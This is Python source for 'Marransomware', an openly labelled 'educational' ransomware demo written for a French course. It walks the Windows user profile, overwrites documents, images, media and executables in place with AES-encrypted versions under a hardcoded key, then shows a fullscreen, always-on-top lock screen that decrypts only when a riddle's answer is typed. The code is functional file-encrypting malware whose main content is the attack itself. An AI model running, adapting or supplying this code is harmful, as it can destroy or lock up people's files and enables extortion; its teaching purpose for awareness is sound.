#!/usr/bin/env python
# coding: utf-8

"""

Marransomware, some educational ransomware.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Version 1.0
~~~~~~~~~~~
WARNING !
DON'T RUN THIS SCRIPT IN YOUR PERSONAL MACHINE, EXECUTE ONLY IN A TEST ENVIRONMENT!

Based on the work of Joe Linoff for the (de)encryption part => [https://github.com/jlinoff/lock_files]
Requires PyCrypto lib and py2exe to make it an executable 'cause it was made for Windows for sensibilization purpose
 
"""

import os
import sys
import fnmatch
import base64
from Crypto import Random
from Crypto.Cipher import AES
from Tkinter import *

# Class imported from the project lock_files

class AESCipher:
    def __init__(self, key):
        self.bs = 32
        if len(key) >= 32:
            self.key = key[:32]
        else:
            self.key = self._pad(key)

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:]))

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    def _unpad(self, s):
        return s[:-ord(s[len(s)-1:])]

# Crypt function

def crypt(password, files):

    aes = AESCipher(password)
    mode = 'encrypt'

    for path in files:
        ifp = open(path, 'rb')
        data = ifp.read()
        ifp.close()

        try:
            ofp = open(path, 'wb')
            ofp.write(aes.encrypt(data))
            ofp.close()

        except ValueError:
            print ('%s operation failed, skipping %s' %(mode, path))

# Decrypt function

def decrypt(password, files):

    aes = AESCipher(password)
    mode = 'decrypt'

    for path in files:
        ifp = open(path, 'rb')
        data = ifp.read()
        ifp.close()

        try:
            ofp = open(path, 'wb')
            ofp.write(aes.decrypt(data))
            ofp.close()

        except ValueError:
            print ('%s operation failed, skipping %s' %(mode, path))

# Set a password for encryption

password = 'toto'

"""

Set the path and the extension types of the encrypted files
Here we encrypt only a sample of popular extensions we can found in the folder C:\Users\<CURRENT_USER>
except in the hidden folder AppData because it was source of encryption problem (right probably)

"""

matches = []
for root, dirnames, filenames in os.walk(os.environ['USERPROFILE']):
    if 'AppData' in dirnames:
        dirnames.remove ('AppData')
    else:
        for extension in ['txt', 'doc', 'docx', 'bat', 'exe', 'pdf', 'png', 'jpg', 'mp3', 'mp4', 'webm', 'ogg', 'xls', 'xlsx','ppt', 'pptx']:
            for filename in fnmatch.filter(filenames, '*.' + extension):
                matches.append(os.path.join(root, filename))
files = matches

# Crypting...

crypt(password, files)

#############################
#     TKINTER INTERFACE     #
#############################

# Initialization of variables

window = Tk()
v = StringVar()
mdpasse = StringVar()
wa = StringVar()
v.set('D')
window.title('Marransomware')
window.attributes("-topmost",1)
window.attributes("-fullscreen",1)
window.overrideredirect(1)
#window.geometry('500x200')

def suppr_f1():

    t1.destroy()
    b1.destroy()
    b2.destroy()
    b3.destroy()
    b4.destroy()
    sub1.destroy()

def suppr_f2():

    t2.destroy()
    t3.destroy()
    f.destroy()
    sub2.destroy()

def farewell():

    sys.exit(0)

def check():
    if v.get() == 'D':
        suppr_f1()
        t2.pack(side = TOP, padx = 10, pady = 10)
        f.focus_set()
        f.pack(padx = 10, pady = 10)
        sub2.pack(padx = 10, pady = 10)
        t3.pack(side = BOTTOM, padx = 5, pady = 5)
    else:
        print 'none'

def mdp():
    if mdpasse.get() == 'marron':
        matches = []
        for root, dirnames, filenames in os.walk(os.environ['USERPROFILE']):
            if 'AppData' in dirnames:
                dirnames.remove ('AppData')
            else:
                for extension in ['txt', 'doc', 'docx', 'bat', 'exe', 'pdf', 'png', 'jpg', 'mp3', 'mp4', 'webm', 'ogg', 'xls', 'xlsx','ppt', 'pptx']:
                    for filename in fnmatch.filter(filenames, '*.' + extension):
                        matches.append(os.path.join(root, filename))
        files = matches
        # Decrypting...
        decrypt(password, files)
        suppr_f2()
        t4.pack(side = TOP, padx = 10, pady = 10)
        sub3.pack(padx = 5, pady = 5)
    else:
        wa.set('Faux !')

def start():
    t1.pack(side = TOP, padx = 5, pady = 5)
    b1.pack()
    b2.pack()
    b3.pack()
    b4.pack()
    sub1.pack(padx = 5, pady = 5)
    
# The project was for a french course so here is some translations:
# ----------------------------------------------------------------
# 'Your files are now cryptolocked, young innocent ! Why did clicked on this executable ?'
t1 = Label(window, text = 'Vos fichiers sont à présent crytolocké jeune innocent !\nPourquoi avez-vous cliqué sur cet executable ?')
# 'Very well to decipher your files answer the following question : "What is small and brown ?"'
t2 = Label(window, text = 'Très bien pour déchiffrer vos fichiers\nrépondez à l\'énigme suivante:\n\n"Qu\'est-ce qui est petit et marron ?"')
t3 = Label(window, textvariable = wa, fg='red')
# 'You should have lost all your data if this was a randsomeware as locky, Save bitcoins and think before clicking next time !'
t4 = Label(window, text = 'Vous auriez pu perdre toutes vos données\nsi c\'était un ransomware comme locky,\nEconomisez des bitcoins et réfléchissez\nla prochaine fois avant de cliquer !')
# "I like clicking on things !"
b1 = Radiobutton(window, text="J'aime cliquer sur des trucs !", variable=v, value="A", state=DISABLED)
# "My antivirus is protecting me anyway !"
b2 = Radiobutton(window, text="Mon antivirus me protège de toute façon !", variable=v, value="B", state=DISABLED)
# "Hey ! I'm only 5 and it's my dad computer !"
b3 = Radiobutton(window, text="Hé! Je n'ai que 5 ans et c'est le PC de mon papa !", variable=v, value="C", state=DISABLED)
# "Because i'm incouscious of the danger but I'll never do it again !"
b4 = Radiobutton(window, text="Parce que je suis inconscient du danger mais je ne le referais plus!", variable=v, value="D")
f = Entry(window, textvariable= mdpasse, show='*')
# 'Validate'
sub1 = Button(window, text ='Valider', command = check)
sub2 = Button(window, text='Valider', command= mdp)
# 'Farewell !'
sub3 = Button(window, text='Adieu !', command= farewell)
# Initialize the first Window
start()
# Start Tkinter
window.mainloop()
